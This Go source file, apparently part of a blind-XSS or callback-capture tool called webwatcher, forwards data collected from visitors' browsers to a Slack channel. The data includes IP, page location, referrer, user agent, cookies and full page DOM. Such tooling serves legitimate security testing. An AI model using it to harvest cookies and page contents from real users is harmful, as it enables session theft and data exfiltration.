package collector

import (
	"net/url"
	"text/template"

	"github.com/pichik/webwatcher/src/auth"
	"github.com/pichik/webwatcher/src/datacenter"
	"github.com/pichik/webwatcher/src/misc"
	"github.com/slack-go/slack"
)

var webhookTemplate *template.Template

var slackClient *slack.Client

func WebhookLoad() {
	slackClient = slack.New(misc.Config.SlackToken)

}

func webhookSend(data *datacenter.Data) {
	if misc.Config.SlackChannel == "" || misc.Config.SlackToken == "" || misc.Config.SlackToken == "slack-token" {
		misc.DebugLog.Printf("No slack specified")
		return
	}

	parsedURL, err := url.Parse(data.Location)
	if err != nil {
		misc.ErrorLog.Printf("Parsing collected url: %s", err)
	}

	attachment := slack.Attachment{
		Pretext:    parsedURL.Host,
		Text:       misc.Config.Host + auth.AdminPanel + data.HASH,
		Color:      "#BF11A8",
		MarkdownIn: []string{"text", "title", "value", "fields"},
		// Fields are Optional extra data!
		Fields: []slack.AttachmentField{
			{
				Title: "Time",
				Value: "``` " + data.BrowserTime + "```",
			},
			{
				Title: "IP",
				Value: "``` " + data.IP + "```",
			},
			{
				Title: "Location",
				Value: "``` " + data.Location + "```",
			},
			{
				Title: "Origin",
				Value: "``` " + data.Origin + "```",
			},
			{
				Title: "Referrer",
				Value: "``` " + data.Referrer + "```",
			},
			{
				Title: "User Agent",
				Value: "``` " + data.UserAgent + "```",
			},
			{
				Title: "Cookies",
				Value: "``` " + data.Cookies + "```",
			},
			{
				Title: "DOM",
				Value: "``` " + data.DOM + "```",
			},
		},
	}

	_, _, err = slackClient.PostMessage(misc.Config.SlackChannel, slack.MsgOptionText("", false), slack.MsgOptionAttachments(attachment))
	if err != nil {
		misc.ErrorLog.Printf("Sending to Slack: %s", err)
	}
}
